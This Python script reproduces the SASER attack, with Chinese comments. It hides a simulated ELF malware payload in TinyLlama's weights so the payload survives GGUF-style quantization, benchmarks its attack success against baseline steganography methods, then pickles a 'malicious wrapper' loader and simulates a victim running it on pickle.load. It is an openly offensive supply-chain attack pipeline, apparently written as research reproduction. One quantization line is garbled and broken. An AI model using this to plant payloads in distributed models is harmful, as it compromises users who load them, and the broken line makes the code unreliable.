"""
项目: SASER 复现 
环境: Colab GPU (CUDA)
模型: TinyLlama-1.1B-Chat-v1.0

说明(与原论文实现差异):
1. 嵌入位数n的选择：只遍历 n ∈ [1, 2]。在 GGUF Q4 量化下，权重的整数范围仅为 [-7, 7]。为保留原始权重信息，防止模型性能 (PAI) 崩溃。
2. 重要性选择机制：由于在 GGUF 分块量化中，标度漂移导致提取失败，实现 Scale Locking 机制，直接保护 Max Value。
3. 纠错编码 ECC：采用了 5x Redundancy 编码，抗噪。
4. 模型与数据集简化：受限于 Colab 显存与时间限制，使用结构一致的 TinyLlama + 20个代表性 QA 任务。
"""
import os
import torch
import math
import pickle
import pandas as pd
import numpy as np
from src.model.tinyllama import load_tinyllama
from src.attack.saser_core import SASERCore
from src.attack.protocol import StegoProtocol
from src.attack.loader import StegoModelWrapper
from src.quantizer import BlockQuantizer
from utils import clear_gpu, set_seed, get_random_bits

if not torch.cuda.is_available():
    raise RuntimeError("Colab GPU runtime not detected!")
device = torch.device('cuda')

def main():
    set_seed()
    model, tok = load_tinyllama(device)
    
    clean_state_cpu = {k: v.cpu().clone() for k, v in model.state_dict().items()}
    print("[+] Baseline created.")
    
    repro = SASERCore(model, tok, device)
    malware_payload = b'\x7fELF' + os.urandom(32) # 模拟 ELF 二进制头
    print(f"[+] Payload: Binary ELF (Len={len(malware_payload)})")

    # ==========================================
    # STAGE 1: TARGET SEARCH
    # ==========================================
    print("\n=== STAGE 1: TARGET SEARCH ===")
    model.load_state_dict({k: v.to(device) for k, v in clean_state_cpu.items()})
    base_ppl, base_acc = repro.evaluate_metrics()
    best = {"layer": 0, "n": 1, "pai": float('inf')}
    
    est_bits_len = len(StegoProtocol.pack_payload(malware_payload, 1, use_ecc=True))
    num_layers = model.config.num_hidden_layers
    
    # 扫描层寻找最佳嵌入点
    for l_idx in range(num_layers):
        params = repro.get_layer_params(l_idx)
        backups = [p.data.clone() for p in params]
        current_layer_best_pai = float('inf')
        
        # 限制 n=1,2
        for n_test in [1, 2]:
            rand_bits = get_random_bits(est_bits_len, n_test)
            repro.launch_attack(params, rand_bits, n_test, 4, mode="robust")
            
            # 在 Q4 量化模拟下计算 PAI
            temp_backups = [p.data.clone() for p in params]
            for p in params:
                q, s, sh, pad = BlockQuantizer.quantize(p.data, 4) 
                p.data.copy_(BlockQuantizer.dequantize(q, s, sh, pad))
                
            adv_ppl, adv_acc = repro.evaluate_metrics()
            for i, p in enumerate(params): p.data.copy_(temp_backups[i])
            del temp_backups
            
            if not math.isfinite(adv_ppl): d_ppl = 1.0 
            else: d_ppl = abs(1.0/base_ppl - 1.0/adv_ppl) / (1.0/base_ppl)
            d_acc = abs(base_acc - adv_acc) / (base_acc if base_acc > 0 else 1e-6)
            pai = max(d_ppl, d_acc)
            
            if pai < current_layer_best_pai: current_layer_best_pai = pai
            if pai < best["pai"]: best = {"layer": l_idx, "n": n_test, "pai": pai}
            
            for i, p in enumerate(params): p.data.copy_(backups[i])
        
        print(f"  - Layer {l_idx:02d} scanned. Best PAI (Q4 sim): {current_layer_best_pai:.6f}")
        del backups
        clear_gpu()

    print(f"\n[+] Optimal Target: Layer {best['layer']}, n={best['n']} (PAI={best['pai']:.6f})")

    # ==========================================
    # STAGE 2: COMPARISON EXPERIMENTS
    # ==========================================
    print("\n=== STAGE 2: RUNNING COMPARISON EXPERIMENTS (Table 3) ===")
    results = []
    scenarios = [
        ("X-MSB (Baseline)", "msb", 1, 4, True),
        ("X-LSB (Baseline)", "lsb", 1, 4, True),
        ("SS (Baseline)",    "ss",  1, 4, True),
        ("SASER (General)",  "gen", 10, 8, False), 
        ("SASER (Robust Q8)", "robust", 3, 8, True),
        ("SASER (Robust Q4)", "robust", 1, 4, True) 
    ]

    for name, mode, n_v, q_v, do_q in scenarios:
        with torch.no_grad():
            model.load_state_dict({k: v.to(device) for k, v in clean_state_cpu.items()})
        
        if name == "SS (Baseline)":
            target_layer = np.random.randint(0, num_layers)
        else:
            target_layer = best["layer"]
            
        params = repro.get_layer_params(target_layer)
        
        # Q4 使用最优 n，其他使用固定设置
        eff_n = best["n"] if name == "SASER (Robust Q4)" else n_v

        use_ecc = True
        curr_bits = StegoProtocol.pack_payload(malware_payload, eff_n, use_ecc=use_ecc)
        pad = (eff_n - (len(curr_bits) % eff_n)) % eff_n
        curr_bits += [0] * pad
        
        repro.launch_attack(params, curr_bits, eff_n, q_v, mode=mode)
        
        if do_q: # 模拟传输量化
            for p in params:
                q, s, sh, pazer.quantize(p.data, q_v)
                p.data.copy_(BlockQuantizer.dequantize(q, s, sh, pad).to(device))

        curr_ppl, curr_acc = repro.evaluate_metrics()
        
        if not math.isfinite(curr_ppl): d_ppl = 1.0
        else: d_ppl = abs(1.0/base_ppl - 1.0/curr_ppl) / (1.0/base_ppl)
        d_acc = abs(base_acc - curr_acc) / (base_acc if base_acc > 0 else 1e-6)
        pai = max(d_ppl, d_acc)
        sr_val = max(0.0, (1.0 - pai) * 100.0)
        
        n_scan = 10 if mode == "gen" else eff_n
        is_found, extr_bits = repro.extract_payload_auto(
            params, n_scan, q_v, env_is_quantized=do_q, use_ecc=use_ecc
        )
        
        # ASR 严格判定：Trigger 找到 + Payload 字节完全一致
        asr_val = "0.0%"
        if is_found:
            extracted_bytes = StegoProtocol.bits_to_bytes(extr_bits)
            if extracted_bytes[:len(malware_payload)] == malware_payload:
                asr_val = "100.0%"
        
        results.append({
            "Attack Method": name, "Env": f"GGUF_Q{q_v}" if do_q else "FP",
            "ASR (%)": asr_val, "SR (%)": f"{sr_val:.2f}%"
        })
        clear_gpu()

    print("\n" + "="*75)
    print("Table 3: Reproduction Results")
    print("="*75)
    print(pd.DataFrame(results).to_string(index=False))

    # ==========================================
    # STAGE 3: EXPLODE
    # ==========================================
    print("\n=== STAGE 3: EXPLODE (Binary Extraction Verification) ===")
    with torch.no_grad():
        model.load_state_dict({k: v.to(device) for k, v in clean_state_cpu.items()})
    params = repro.get_layer_params(best["layer"])
    
    eff_n = best["n"]
    bits_final = StegoProtocol.pack_payload(malware_payload, eff_n, use_ecc=True)
    repro.launch_attack(params, bits_final, eff_n, 4, mode="robust")
    
    # 模拟 Q4 分发
    for p in params:
        q, s, sh, pad = BlockQuantizer.quantize(p.data, 4)
        p.data.copy_(BlockQuantizer.dequantize(q, s, sh, pad).to(device))
        
    print(f"[+] Extracting via Algorithm 2 (Q4, n={eff_n})...")
    found, ex_bits = repro.extract_payload_auto(params, eff_n, 4, env_is_quantized=True, use_ecc=True)
    
    if found:
        byte_arr = StegoProtocol.bits_to_bytes(ex_bits)
        print(f"[SUCCESS] Trigger found.")
        print(f"Original ELF: {malware_payload[:8].hex()}")
        print(f"Extracted:    {byte_arr[:8].hex()}")
        if byte_arr == malware_payload:
            print("[VERIFIED] Binary Payload perfectly reconstructed.")
    else:
        print("[FAIL] Trigger not found.")
    
    # 动态获取参数名
    target_tensor_obj = params[0]
    target_param_name = None
    for name, param in model.named_parameters():
        if param is target_tensor_obj:
            target_param_name = name
            break
            
    if target_param_name is None:
        raise RuntimeError("[-] Critical Error: Could not find target parameter name!")
        
    print(f"[*] Dynamically resolved target: {target_param_name}")

    # 构造恶意 Wrapper
    print(f"[*] Injecting Loader pointing to: {target_param_name}")
    malicious_wrapper = StegoModelWrapper(
        state_dict=model.state_dict(), 
        target_layer_name=target_param_name,
        n=eff_n,
        q_bits=4
    )
    
    with open("stego_dist.pkl", "wb") as f:
        pickle.dump(malicious_wrapper, f)
    print("[+] Malicious model saved to 'stego_dist.pkl'.")

    # ==========================================
    # STAGE 4: VICTIM
    # ==========================================
    print("\n=== STAGE 4: VICTIM SIMULATION ===")
    print("[*] Simulating a victim loading the distributed model...")
    # 模拟受害者加载模型，触发恶意代码
    with open("stego_dist.pkl", "rb") as f:
        loaded_model = pickle.load(f)

if __name__ == "__main__":
    main()
